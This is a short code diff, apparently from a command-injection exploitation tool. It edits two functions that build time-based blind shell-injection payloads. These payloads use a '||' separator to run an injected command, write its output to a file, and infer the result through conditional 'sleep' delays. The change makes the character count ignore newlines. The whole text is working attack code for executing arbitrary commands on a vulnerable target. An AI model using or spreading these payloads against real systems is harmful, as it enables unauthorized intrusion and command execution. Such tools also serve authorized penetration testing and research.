@@ -57,7 +57,7 @@ def decision(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
   elif separator == "||" :
     payload = (separator + " "
 	      "echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
-	      "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + separator + " "
+	      "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\n' | wc -c) ] " + separator + " "
 	      "sleep " + str(delay)
 	      )  
   else:
@@ -146,7 +146,7 @@ def cmd_execution(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
   elif separator == "||" :		
     payload = (separator + " "
 	      "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
-	      "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | wc -c) ] " + separator + " "
+	      "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\n' | wc -c) ] " + separator + " "
 	      "sleep " + str(delay)
 	      ) 		    
   else:
